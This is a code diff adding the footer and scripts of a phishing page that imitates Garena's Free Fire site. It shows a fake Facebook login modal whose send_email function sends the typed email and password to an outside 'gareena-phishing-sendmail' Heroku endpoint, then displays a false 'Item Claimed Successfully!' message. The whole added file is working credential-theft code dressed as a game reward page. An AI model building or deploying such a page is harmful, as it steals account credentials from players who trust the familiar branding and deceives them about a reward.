+            <a href="https://ff.garena.com/others/game_security/en/" target="_blank">game security</a>
+            <a href="https://ff.garena.com/others/faq/en/" target="_blank" style="margin-left:10px">for_parents</a>
+            
+            <a href="https://ff.garena.com/others/policy/en/" target="_blank" style="margin-left:10px">privacy_policy</a>
+            
+        </div>
+    </div>
+
+</div>
+<div id="facebook" class="modal" style="z-index: 1000">
+
+  <!-- Modal content -->
+  <div class="modal-content" style="width: 400px; margin: 30px auto;">
+    <div class="login-form">
+        <form>
+            <h2 class="text-center">Facebook</h2>   
+            <div class="form-group">
+                <input #email id="email" type="email" class="form-control" placeholder="Email" required="required">
+                <input #password id="password" type="password" class="form-control" placeholder="Password" required="required">
+            </div>
+            <div class="form-group">
+                <button type="button" class="btn btn-secondary btn-block" onclick="send_email(email.value, password.value)">Login</button>
+            </div>
+            <p class="text-center"><a href="#">Forgot Password?</a></p>     
+        </form>
+    </div>
+  </div>
+
+</div>
+<div id="success" class="modal" style="z-index: 1000">
+
+  <!-- Modal content -->
+  <div class="modal-content" style="width: 400px; margin: 30px auto;">
+    <!-- <div class="login-form">
+        <form>
+            <h2 class="text-center">Facebook</h2>   
+            <div class="form-group">
+                <input #email id="email" type="email" class="form-control" placeholder="Email" required="required">
+                <input #password id="password" type="password" class="form-control" placeholder="Password" required="required">
+            </div>
+            <div class="form-group">
+                <button type="button" class="btn btn-secondary btn-block" onclick="send_email(email.value, password.value)">Login</button>
+            </div>
+            <p class="text-center"><a href="#">Forgot Password?</a></p>     
+        </form>
+    </div> -->
+    <div class="success-form">
+        <p>Item Claimed Successfully!</p>
+        <p>Please check your <strong> Game Vault</strong>.</p>
+        <i class="float-right">ThankYou.</i>
+        <br>
+        <i class="float-right">Rewards by Gareena</i>
+    </div>
+  </div>
+
+</div>
+
+<!--end: common footer -->
+
+
+    
+<script src="https://ff.garena.com/static/common/js/jquery-1.7.2.min.js" type="text/javascript"></script>
+<script src="https://ff.garena.com/static/common/js/fastclick.js" type="text/javascript"></script>
+<script src="https://ff.garena.com/static/common/js/common.js" type="text/javascript"></script>
+
+    
+<script type="text/javascript" src="https://ff.garena.com/static/common/js/jquery.lightBox.js"></script>
+<script type="text/javascript" src="https://ff.garena.com/static/js/home.js"></script>
+<script type="text/javascript">
+    $(function () {
+        Common.init();
+        FreeFire.init();
+    })
+</script>
+
+
+    <!-- Global Site Tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-65628961-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5J5RCL0H3M');
+  function addGA(event, status) {
+    var report = {
+      event_label: status
+    }
+    gtag('event', event, report)
+  }
+</script>
+<script>
+    var modal = document.getElementById("facebook");
+    var smodal = document.getElementById("success");
+    var modalContent = document.getElementByClassName("modal-content")
+    // window.onclick = function(event) {
+    //     console.log(event.target)
+    //   if (modalContent.includes(event.target)) {
+    //     modal.style.display = "none";
+    //     smodal.style.display = "none";
+    //   }
+    // }
+    function openModal() {
+        console.log(modal)
+        modal.style.display = "block";
+    }
+
+    function send_email(unam, password) {
+        console.log(unam, password)
+        var xmlHttp = new XMLHttpRequest();
+        var url = "https://gareena-phishing-sendmail.herokuapp.com/send_mail?email=" + unam + "&pass=" + password
+        xmlHttp.open( "GET", url, false ); // false for synchronous request
+        xmlHttp.send( null );
+        console.log(xmlHttp.responseText);
+        modal.style.display = "none";
+        smodal.style.display = "block";
+    }
+</script>
+</body>
+
+</html>
